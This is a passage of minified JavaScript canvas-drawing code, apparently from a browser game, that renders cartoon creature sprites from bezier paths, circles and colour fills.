                    n.globalAlpha = 1,
                    ke(n, 0, 0, a),
                    he(n, t[3]),
                    n.restore(),
                    n.save(),
                    n.translate(27 * e + _, E),
                    n.globalAlpha = 1,
                    ke(n, 0, 0, s),
                    he(n, t[4]),
                    i
            }
            function p1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 188 * e,
                    i.height = 190 * e,
                    n.globalAlpha = .5,
                    n.translate(0, 5 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(33.00567626953125 * e, 95.44320678710938 * e),
                    n.bezierCurveTo(42.00567626953125 * e, 87.44320678710938 * e, 48.00567626953125 * e, 51.443206787109375 * e, 74.00567626953125 * e, 47.443206787109375 * e),
                    n.bezierCurveTo(100.00567626953125 * e, 42.443206787109375 * e, 118.00567626953125 * e, 49.443206787109375 * e, 131.00567626953125 * e, 55.443206787109375 * e),
                    n.bezierCurveTo(140.00567626953125 * e, 70.44320678710938 * e, 145.00567626953125 * e, 87.44320678710938 * e, 152.00567626953125 * e, 94.44320678710938 * e),
                    n.bezierCurveTo(149.00567626953125 * e, 99.44320678710938 * e, 147.00567626953125 * e, 98.44320678710938 * e, 141.00567626953125 * e, 101.44320678710938 * e),
                    n.bezierCurveTo(147.00567626953125 * e, 108.44320678710938 * e, 147.00567626953125 * e, 111.44320678710938 * e, 147.00567626953125 * e, 112.44320678710938 * e),
                    n.bezierCurveTo(143.00567626953125 * e, 112.44320678710938 * e, 141.00567626953125 * e, 112.44320678710938 * e, 137.00567626953125 * e, 111.44320678710938 * e),
                    n.bezierCurveTo(138.00567626953125 * e, 117.44320678710938 * e, 138.00567626953125 * e, 120.44320678710938 * e, 138.00567626953125 * e, 124.44320678710938 * e),
                    n.bezierCurveTo(125.00567626953125 * e, 107.44320678710938 * e, 121.00567626953125 * e, 124.44320678710938 * e, 110.00567626953125 * e, 141.44320678710938 * e),
                    n.bezierCurveTo(102.00567626953125 * e, 158.44320678710938 * e, 89.00567626953125 * e, 158.44320678710938 * e, 80.00567626953125 * e, 144.44320678710938 * e),
                    n.bezierCurveTo(61.00567626953125 * e, 111.44320678710938 * e, 56.00567626953125 * e, 117.44320678710938 * e, 48.00567626953125 * e, 120.44320678710938 * e),
                    n.bezierCurveTo(46.00567626953125 * e, 118.44320678710938 * e, 47.00567626953125 * e, 112.44320678710938 * e, 48.00567626953125 * e, 107.44320678710938 * e),
                    n.bezierCurveTo(43.00567626953125 * e, 111.44320678710938 * e, 40.00567626953125 * e, 111.44320678710938 * e, 37.00567626953125 * e, 110.44320678710938 * e),
                    n.bezierCurveTo(39.50567626953125 * e, 104.94320678710938 * e, 39.50567626953125 * e, 104.94320678710938 * e, 42.00567626953125 * e, 99.44320678710938 * e),
                    n.bezierCurveTo(33.00567626953125 * e, 99.44320678710938 * e, 33.00567626953125 * e, 98.44320678710938 * e, 33.00567626953125 * e, 96.44320678710938 * e),
                    n.closePath(),
                    he(n, t[0], t[0], 4 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(60.00567626953125 * e, 99.35227966308594 * e),
                    n.bezierCurveTo(70.00567626953125 * e, 82.35227966308594 * e, 85.00567626953125 * e, 86.35227966308594 * e, 87.00567626953125 * e, 97.35227966308594 * e),
                    n.bezierCurveTo(89.00567626953125 * e, 101.35227966308594 * e, 88.00567626953125 * e, 105.35227966308594 * e, 87.00567626953125 * e, 110.35227966308594 * e),
                    n.bezierCurveTo(89.00567626953125 * e, 111.35227966308594 * e, 91.00567626953125 * e, 112.35227966308594 * e, 93.00567626953125 * e, 115.35227966308594 * e),
                    n.bezierCurveTo(96.00567626953125 * e, 111.35227966308594 * e, 99.00567626953125 * e, 111.35227966308594 * e, 100.00567626953125 * e, 110.35227966308594 * e),
                    n.bezierCurveTo(98.00567626953125 * e, 92.35227966308594 * e, 103.00567626953125 * e, 86.35227966308594 * e, 113.00567626953125 * e, 89.35227966308594 * e),
                    n.bezierCurveTo(122.00567626953125 * e, 92.35227966308594 * e, 123.00567626953125 * e, 94.35227966308594 * e, 126.00567626953125 * e, 98.35227966308594 * e),
                    n.bezierCurveTo(124.00567626953125 * e, 102.35227966308594 * e, 123.00567626953125 * e, 103.35227966308594 * e, 121.00567626953125 * e, 104.35227966308594 * e),
                    n.bezierCurveTo(124.00567626953125 * e, 105.35227966308594 * e, 126.00567626953125 * e, 107.35227966308594 * e, 129.00567626953125 * e, 111.35227966308594 * e),
                    n.bezierCurveTo(115.00567626953125 * e, 122.35227966308594 * e, 113.00567626953125 * e, 145.35227966308594 * e, 100.00567626953125 * e, 152.35227966308594 * e),
                    n.bezierCurveTo(91.00567626953125 * e, 158.35227966308594 * e, 83.00567626953125 * e, 149.35227966308594 * e, 76.00567626953125 * e, 138.35227966308594 * e),
                    n.bezierCurveTo(67.00567626953125 * e, 114.35227966308594 * e, 63.00567626953125 * e, 113.35227966308594 * e, 59.00567626953125 * e, 111.35227966308594 * e),
                    n.bezierCurveTo(62.00567626953125 * e, 107.35227966308594 * e, 64.00567626953125 * e, 105.35227966308594 * e, 66.00567626953125 * e, 104.35227966308594 * e),
                    n.bezierCurveTo(63.00567626953125 * e, 100.35227966308594 * e, 62.00567626953125 * e, 100.35227966308594 * e, 60.00567626953125 * e, 99.35227966308594 * e),
                    n.closePath(),
                    he(n, t[0], t[0], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(51.00567626953125 * e, 72.53409576416016 * e),
                    n.bezierCurveTo(48.00567626953125 * e, 56.534095764160156 * e, 48.00567626953125 * e, 49.534095764160156 * e, 54.00567626953125 * e, 35.534095764160156 * e),
                    n.bezierCurveTo(58.00567626953125 * e, 26.534095764160156 * e, 65.00567626953125 * e, 27.534095764160156 * e, 73.00567626953125 * e, 40.534095764160156 * e),
                    n.bezierCurveTo(81.00567626953125 * e, 49.534095764160156 * e, 82.00567626953125 * e, 50.534095764160156 * e, 83.00567626953125 * e, 51.534095764160156 * e),
                    n.bezierCurveTo(77.00567626953125 * e, 71.53409576416016 * e, 64.00567626953125 * e, 75.53409576416016 * e, 51.00567626953125 * e, 72.53409576416016 * e),
                    n.closePath(),
                    he(n, t[0], t[0], 2 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(105.00567626953125 * e, 50.53410339355469 * e),
                    n.bezierCurveTo(112.00567626953125 * e, 48.53410339355469 * e, 125.00567626953125 * e, 21.534103393554688 * e, 132.00567626953125 * e, 33.53410339355469 * e),
                    n.bezierCurveTo(138.00567626953125 * e, 42.53410339355469 * e, 140.00567626953125 * e, 64.53410339355469 * e, 136.00567626953125 * e, 75.53410339355469 * e),
                    n.closePath(),
                    he(n, t[0], t[0], 2 * e),
                    n.globalAlpha = 1,
                    n.translate(0, -5 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(33.00567626953125 * e, 95.44320678710938 * e),
                    n.bezierCurveTo(42.00567626953125 * e, 87.44320678710938 * e, 48.00567626953125 * e, 51.443206787109375 * e, 74.00567626953125 * e, 47.443206787109375 * e),
                    n.bezierCurveTo(100.00567626953125 * e, 42.443206787109375 * e, 118.00567626953125 * e, 49.443206787109375 * e, 131.00567626953125 * e, 55.443206787109375 * e),
                    n.bezierCurveTo(140.00567626953125 * e, 70.44320678710938 * e, 145.00567626953125 * e, 87.44320678710938 * e, 152.00567626953125 * e, 94.44320678710938 * e),
                    n.bezierCurveTo(149.00567626953125 * e, 99.44320678710938 * e, 147.00567626953125 * e, 98.44320678710938 * e, 141.00567626953125 * e, 101.44320678710938 * e),
                    n.bezierCurveTo(147.00567626953125 * e, 108.44320678710938 * e, 147.00567626953125 * e, 111.44320678710938 * e, 147.00567626953125 * e, 112.44320678710938 * e),
                    n.bezierCurveTo(143.00567626953125 * e, 112.44320678710938 * e, 141.00567626953125 * e, 112.44320678710938 * e, 137.00567626953125 * e, 111.44320678710938 * e),
                    n.bezierCurveTo(138.00567626953125 * e, 117.44320678710938 * e, 138.00567626953125 * e, 120.44320678710938 * e, 138.00567626953125 * e, 124.44320678710938 * e),
                    n.bezierCurveTo(125.00567626953125 * e, 107.44320678710938 * e, 121.00567626953125 * e, 124.44320678710938 * e, 110.00567626953125 * e, 141.44320678710938 * e),
                    n.bezierCurveTo(102.00567626953125 * e, 158.44320678710938 * e, 89.00567626953125 * e, 158.44320678710938 * e, 80.00567626953125 * e, 144.44320678710938 * e),
                    n.bezierCurveTo(61.00567626953125 * e, 111.44320678710938 * e, 56.00567626953125 * e, 117.44320678710938 * e, 48.00567626953125 * e, 120.44320678710938 * e),
                    n.bezierCurveTo(46.00567626953125 * e, 118.44320678710938 * e, 47.00567626953125 * e, 112.44320678710938 * e, 48.00567626953125 * e, 107.44320678710938 * e),
                    n.bezierCurveTo(43.00567626953125 * e, 111.44320678710938 * e, 40.00567626953125 * e, 111.44320678710938 * e, 37.00567626953125 * e, 110.44320678710938 * e),
                    n.bezierCurveTo(39.50567626953125 * e, 104.94320678710938 * e, 39.50567626953125 * e, 104.94320678710938 * e, 42.00567626953125 * e, 99.44320678710938 * e),
                    n.bezierCurveTo(33.00567626953125 * e, 99.44320678710938 * e, 33.00567626953125 * e, 98.44320678710938 * e, 33.00567626953125 * e, 96.44320678710938 * e),
                    n.closePath(),
                    he(n, t[1], t[2], 3 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(60.00567626953125 * e, 99.35227966308594 * e),
                    n.bezierCurveTo(70.00567626953125 * e, 82.35227966308594 * e, 85.00567626953125 * e, 86.35227966308594 * e, 87.00567626953125 * e, 97.35227966308594 * e),
                    n.bezierCurveTo(89.00567626953125 * e, 101.35227966308594 * e, 88.00567626953125 * e, 105.35227966308594 * e, 87.00567626953125 * e, 110.35227966308594 * e),
                    n.bezierCurveTo(89.00567626953125 * e, 111.35227966308594 * e, 91.00567626953125 * e, 112.35227966308594 * e, 93.00567626953125 * e, 115.35227966308594 * e),
                    n.bezierCurveTo(96.00567626953125 * e, 111.35227966308594 * e, 99.00567626953125 * e, 111.35227966308594 * e, 100.00567626953125 * e, 110.35227966308594 * e),
                    n.bezierCurveTo(98.00567626953125 * e, 92.35227966308594 * e, 103.00567626953125 * e, 86.35227966308594 * e, 113.00567626953125 * e, 89.35227966308594 * e),
                    n.bezierCurveTo(122.00567626953125 * e, 92.35227966308594 * e, 123.00567626953125 * e, 94.35227966308594 * e, 126.00567626953125 * e, 98.35227966308594 * e),
                    n.bezierCurveTo(124.00567626953125 * e, 102.35227966308594 * e, 123.00567626953125 * e, 103.35227966308594 * e, 121.00567626953125 * e, 104.35227966308594 * e),
                    n.bezierCurveTo(124.00567626953125 * e, 105.35227966308594 * e, 126.00567626953125 * e, 107.35227966308594 * e, 129.00567626953125 * e, 111.35227966308594 * e),
                    n.bezierCurveTo(115.00567626953125 * e, 122.35227966308594 * e, 113.00567626953125 * e, 145.35227966308594 * e, 100.00567626953125 * e, 152.35227966308594 * e),
                    n.bezierCurveTo(91.00567626953125 * e, 158.35227966308594 * e, 83.00567626953125 * e, 149.35227966308594 * e, 76.00567626953125 * e, 138.35227966308594 * e),
                    n.bezierCurveTo(67.00567626953125 * e, 114.35227966308594 * e, 63.00567626953125 * e, 113.35227966308594 * e, 59.00567626953125 * e, 111.35227966308594 * e),
                    n.bezierCurveTo(62.00567626953125 * e, 107.35227966308594 * e, 64.00567626953125 * e, 105.35227966308594 * e, 66.00567626953125 * e, 104.35227966308594 * e),
                    n.bezierCurveTo(63.00567626953125 * e, 100.35227966308594 * e, 62.00567626953125 * e, 100.35227966308594 * e, 60.00567626953125 * e, 99.35227966308594 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(33.00567626953125 * e, 95.44320678710938 * e),
                    n.bezierCurveTo(42.00567626953125 * e, 87.44320678710938 * e, 48.00567626953125 * e, 51.443206787109375 * e, 74.00567626953125 * e, 47.443206787109375 * e),
                    n.bezierCurveTo(100.00567626953125 * e, 42.443206787109375 * e, 118.00567626953125 * e, 49.443206787109375 * e, 131.00567626953125 * e, 55.443206787109375 * e),
                    n.bezierCurveTo(140.00567626953125 * e, 70.44320678710938 * e, 145.00567626953125 * e, 87.44320678710938 * e, 152.00567626953125 * e, 94.44320678710938 * e),
                    n.bezierCurveTo(149.00567626953125 * e, 99.44320678710938 * e, 147.00567626953125 * e, 98.44320678710938 * e, 141.00567626953125 * e, 101.44320678710938 * e),
                    n.bezierCurveTo(147.00567626953125 * e, 108.44320678710938 * e, 147.00567626953125 * e, 111.44320678710938 * e, 147.00567626953125 * e, 112.44320678710938 * e),
                    n.bezierCurveTo(143.00567626953125 * e, 112.44320678710938 * e, 141.00567626953125 * e, 112.44320678710938 * e, 137.00567626953125 * e, 111.44320678710938 * e),
                    n.bezierCurveTo(138.00567626953125 * e, 117.44320678710938 * e, 138.00567626953125 * e, 120.44320678710938 * e, 138.00567626953125 * e, 124.44320678710938 * e),
                    n.bezierCurveTo(125.00567626953125 * e, 107.44320678710938 * e, 121.00567626953125 * e, 124.44320678710938 * e, 110.00567626953125 * e, 141.44320678710938 * e),
                    n.bezierCurveTo(102.00567626953125 * e, 158.44320678710938 * e, 89.00567626953125 * e, 158.44320678710938 * e, 80.00567626953125 * e, 144.44320678710938 * e),
                    n.bezierCurveTo(61.00567626953125 * e, 111.44320678710938 * e, 56.00567626953125 * e, 117.44320678710938 * e, 48.00567626953125 * e, 120.44320678710938 * e),
                    n.bezierCurveTo(46.00567626953125 * e, 118.44320678710938 * e, 47.00567626953125 * e, 112.44320678710938 * e, 48.00567626953125 * e, 107.44320678710938 * e),
                    n.bezierCurveTo(43.00567626953125 * e, 111.44320678710938 * e, 40.00567626953125 * e, 111.44320678710938 * e, 37.00567626953125 * e, 110.44320678710938 * e),
                    n.bezierCurveTo(39.50567626953125 * e, 104.94320678710938 * e, 39.50567626953125 * e, 104.94320678710938 * e, 42.00567626953125 * e, 99.44320678710938 * e),
                    n.bezierCurveTo(33.00567626953125 * e, 99.44320678710938 * e, 33.00567626953125 * e, 98.44320678710938 * e, 33.00567626953125 * e, 96.44320678710938 * e),
                    n.closePath(),
                    he(n, void 0, t[2], 3 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(51.00567626953125 * e, 72.53409576416016 * e),
                    n.bezierCurveTo(48.00567626953125 * e, 56.534095764160156 * e, 48.00567626953125 * e, 49.534095764160156 * e, 54.00567626953125 * e, 35.534095764160156 * e),
                    n.bezierCurveTo(58.00567626953125 * e, 26.534095764160156 * e, 65.00567626953125 * e, 27.534095764160156 * e, 73.00567626953125 * e, 40.534095764160156 * e),
                    n.bezierCurveTo(81.00567626953125 * e, 49.534095764160156 * e, 82.00567626953125 * e, 50.534095764160156 * e, 83.00567626953125 * e, 51.534095764160156 * e),
                    he(n, t[1], t[2], 3 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(105.00567626953125 * e, 50.53410339355469 * e),
                    n.bezierCurveTo(112.00567626953125 * e, 48.53410339355469 * e, 125.00567626953125 * e, 21.534103393554688 * e, 132.00567626953125 * e, 33.53410339355469 * e),
                    n.bezierCurveTo(138.00567626953125 * e, 42.53410339355469 * e, 140.00567626953125 * e, 64.53410339355469 * e, 136.00567626953125 * e, 75.53410339355469 * e),
                    he(n, t[1], t[2], 3 * e),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(57.00567626953125 * e, 68.53410339355469 * e),
                    n.bezierCurveTo(63.00567626953125 * e, 69.53410339355469 * e, 69.00567626953125 * e, 66.53410339355469 * e, 73.00567626953125 * e, 60.53410339355469 * e),
                    n.bezierCurveTo(66.00567626953125 * e, 47.53410339355469 * e, 61.00567626953125 * e, 42.53410339355469 * e, 58.00567626953125 * e, 49.53410339355469 * e),
                    n.bezierCurveTo(56.00567626953125 * e, 59.53410339355469 * e, 56.00567626953125 * e, 64.53410339355469 * e, 57.00567626953125 * e, 67.53410339355469 * e),
                    n.closePath(),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(115.00567626953125 * e, 59.715911865234375 * e),
                    n.bezierCurveTo(119.00567626953125 * e, 48.715911865234375 * e, 126.00567626953125 * e, 41.715911865234375 * e, 129.00567626953125 * e, 48.715911865234375 * e),
                    n.bezierCurveTo(131.00567626953125 * e, 56.715911865234375 * e, 133.00567626953125 * e, 71.71591186523438 * e, 127.00567626953125 * e, 68.71591186523438 * e),
                    n.bezierCurveTo(120.00567626953125 * e, 67.71591186523438 * e, 114.00567626953125 * e, 59.715911865234375 * e, 116.00567626953125 * e, 58.715911865234375 * e),
                    n.closePath(),
                    he(n, t[3]),
                    ke(n, 77 * e, 107 * e, 6 * e),
                    he(n, t[2]),
                    ke(n, 110 * e, 107 * e, 6 * e),
                    he(n, t[2]),
                    ke(n, 75 * e, 105 * e, 3 * e),
                    he(n, t[4]),
                    ke(n, 108 * e, 105 * e, 3 * e),
                    he(n, t[4]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(88.00567626953125 * e, 141.4431915283203 * e),
                    n.bezierCurveTo(93.00567626953125 * e, 137.4431915283203 * e, 96.00567626953125 * e, 138.4431915283203 * e, 100.00567626953125 * e, 141.4431915283203 * e),
                    n.bezierCurveTo(103.00567626953125 * e, 143.4431915283203 * e, 101.00567626953125 * e, 149.4431915283203 * e, 95.00567626953125 * e, 148.4431915283203 * e),
                    n.bezierCurveTo(85.00567626953125 * e, 148.4431915283203 * e, 86.00567626953125 * e, 145.4431915283203 * e, 88.00567626953125 * e, 142.4431915283203 * e),
                    n.closePath(),
                    he(n, t[1]),
                    i
            }
            function R1(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 55 * e
                    , a = 8 * e;
                return n.width = 55 * e,
                    n.height = o,
                    r.translate(-65 * e, -55 * e + a),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.moveTo(95 * e, 60 * e),
                    r.bezierCurveTo(107 * e, 62 * e, 110 * e, 73 * e, 107 * e, 79 * e),
                    r.bezierCurveTo(104 * e, 85 * e, 85 * e, 93 * e, 81 * e, 88 * e),
                    r.bezierCurveTo(74 * e, 80 * e, 85 * e, 60 * e, 95 * e, 60 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 3),
                    r.globalAlpha = 1,
                    r.beginPath(),
                    r.moveTo(91 * e, 70 * e),
                    r.bezierCurveTo(91 * e, 75 * e, 100 * e, 76 * e, 100 * e, 73 * e),
                    r.bezierCurveTo(100 * e, 69 * e, 89 * e, 65 * e, 91 * e, 70 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 3),
                    n
            }
            function C1(e, t) {
                var i = document.createElement("canvas")
                    , n = i.getContext("2d");
                return i.width = 238 * e,
                    i.height = 230 * e,
                    n.translate(-93 * e, -110 * e + 5 * e),
                    n.globalAlpha = .3,
                    ke(n, 213.5 * e, 256.75 * e, 75 * e),
                    he(n, t[5]),
                    ke(n, 213.5 * e, 175.75 * e, 25 * e),
                    he(n, t[5]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(156.5 * e, 137.75 * e),
                    n.bezierCurveTo(170.5 * e, 173.75 * e, 195.5 * e, 177.75 * e, 209.5 * e, 177.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(217.5 * e, 178.75 * e),
                    n.bezierCurveTo(251.5 * e, 177.75 * e, 263.5 * e, 153.75 * e, 270.5 * e, 140.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(130.5 * e, 124.75 * e),
                    n.bezierCurveTo(153.5 * e, 185.75 * e, 198.5 * e, 185.75 * e, 213.5 * e, 185.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(214.5 * e, 183.75 * e),
                    n.bezierCurveTo(265.5 * e, 192.75 * e, 293.5 * e, 141.75 * e, 297.5 * e, 124.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(107.5 * e, 213.75 * e),
                    n.bezierCurveTo(151.5 * e, 190.75 * e, 198.5 * e, 184.75 * e, 210.5 * e, 184.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(212.5 * e, 187.75 * e),
                    n.bezierCurveTo(258.5 * e, 182.75 * e, 286.5 * e, 194.75 * e, 314.5 * e, 206.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(102.5 * e, 258.75 * e),
                    n.bezierCurveTo(142.5 * e, 200.75 * e, 193.5 * e, 194.75 * e, 211.5 * e, 185.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(214.5 * e, 192.75 * e),
                    n.bezierCurveTo(276.5 * e, 194.75 * e, 306.5 * e, 233.75 * e, 316.5 * e, 246.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[5],
                    n.stroke(),
                    n.translate(0, -5),
                    n.globalAlpha = 1,
                    ke(n, 213.5 * e, 256.75 * e, 75 * e),
                    he(n, t[3]),
                    ke(n, 213.5 * e, 175.75 * e, 25 * e),
                    he(n, t[3]),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(219.5 * e, 158.75 * e),
                    n.bezierCurveTo(226.5 * e, 159.75 * e, 227.5 * e, 147.75 * e, 219.5 * e, 145.75 * e),
                    n.closePath(),
                    n.lineWidth = 10 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(210.5 * e, 160.75 * e),
                    n.bezierCurveTo(203.5 * e, 159.75 * e, 199.5 * e, 146.75 * e, 210.5 * e, 145.75 * e),
                    n.closePath(),
                    n.lineWidth = 10 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(219.5 * e, 158.75 * e),
                    n.bezierCurveTo(226.5 * e, 159.75 * e, 227.5 * e, 147.75 * e, 219.5 * e, 145.75 * e),
                    n.closePath(),
                    n.fillStyle = t[0],
                    n.fill(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(210.5 * e, 160.75 * e),
                    n.bezierCurveTo(203.5 * e, 159.75 * e, 199.5 * e, 146.75 * e, 210.5 * e, 145.75 * e),
                    n.closePath(),
                    n.fillStyle = t[0],
                    n.fill(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(156.5 * e, 137.75 * e),
                    n.bezierCurveTo(170.5 * e, 173.75 * e, 195.5 * e, 177.75 * e, 209.5 * e, 177.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(217.5 * e, 178.75 * e),
                    n.bezierCurveTo(251.5 * e, 177.75 * e, 263.5 * e, 153.75 * e, 270.5 * e, 140.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(130.5 * e, 124.75 * e),
                    n.bezierCurveTo(153.5 * e, 185.75 * e, 198.5 * e, 185.75 * e, 213.5 * e, 185.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(214.5 * e, 183.75 * e),
                    n.bezierCurveTo(265.5 * e, 192.75 * e, 293.5 * e, 141.75 * e, 297.5 * e, 124.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(107.5 * e, 213.75 * e),
                    n.bezierCurveTo(151.5 * e, 190.75 * e, 198.5 * e, 184.75 * e, 210.5 * e, 184.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(212.5 * e, 187.75 * e),
                    n.bezierCurveTo(258.5 * e, 182.75 * e, 286.5 * e, 194.75 * e, 314.5 * e, 206.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(102.5 * e, 258.75 * e),
                    n.bezierCurveTo(142.5 * e, 200.75 * e, 193.5 * e, 194.75 * e, 211.5 * e, 185.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(214.5 * e, 192.75 * e),
                    n.bezierCurveTo(276.5 * e, 194.75 * e, 306.5 * e, 233.75 * e, 316.5 * e, 246.75 * e),
                    n.lineWidth = 17 * e,
                    n.strokeStyle = t[3],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(156.5 * e, 137.75 * e),
                    n.bezierCurveTo(170.5 * e, 173.75 * e, 195.5 * e, 177.75 * e, 209.5 * e, 177.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(217.5 * e, 178.75 * e),
                    n.bezierCurveTo(251.5 * e, 177.75 * e, 263.5 * e, 153.75 * e, 270.5 * e, 140.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(130.5 * e, 124.75 * e),
                    n.bezierCurveTo(153.5 * e, 185.75 * e, 198.5 * e, 185.75 * e, 213.5 * e, 185.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(214.5 * e, 183.75 * e),
                    n.bezierCurveTo(265.5 * e, 192.75 * e, 293.5 * e, 141.75 * e, 297.5 * e, 124.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(107.5 * e, 213.75 * e),
                    n.bezierCurveTo(151.5 * e, 190.75 * e, 198.5 * e, 184.75 * e, 210.5 * e, 184.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(212.5 * e, 187.75 * e),
                    n.bezierCurveTo(258.5 * e, 182.75 * e, 286.5 * e, 194.75 * e, 314.5 * e, 206.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(102.5 * e, 258.75 * e),
                    n.bezierCurveTo(142.5 * e, 200.75 * e, 193.5 * e, 194.75 * e, 211.5 * e, 185.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    n.beginPath(),
                    n.lineCap = "round",
                    n.lineJoin = "round",
                    n.moveTo(214.5 * e, 192.75 * e),
                    n.bezierCurveTo(276.5 * e, 194.75 * e, 306.5 * e, 233.75 * e, 316.5 * e, 246.75 * e),
                    n.lineWidth = 8 * e,
                    n.strokeStyle = t[0],
                    n.stroke(),
                    ke(n, 213.5 * e, 256.75 * e, 70 * e),
                    he(n, t[0]),
                    ke(n, 213.5 * e, 175.75 * e, 20 * e),
                    he(n, t[0]),
                    ke(n, 222 * e, 166 * e, 5 * e),
                    n.fillStyle = t[2],
                    n.fill(),
                    ke(n, 205 * e, 166 * e, 5 * e),
                    n.fillStyle = t[2],
                    n.fill(),
                    ke(n, 206.2 * e, 167 * e, 2.5 * e),
                    n.fillStyle = t[4],
                    n.fill(),
                    ke(n, 223.2 * e, 167 * e, 2.5 * e),
                    n.fillStyle = t[4],
                    n.fill(),
                    n.save(),
                    n.translate(213.5 * e, 293.75 * e),
                    n.rotate(.76),
                    Ve(n, -22 * e, -21 * e, 44 * e, 42 * e, 6 * e),
                    n.restore(),
                    n.fillStyle = t[1],
                    n.fill(),
                    n.save(),
                    n.translate(212.5 * e, 258.25 * e),
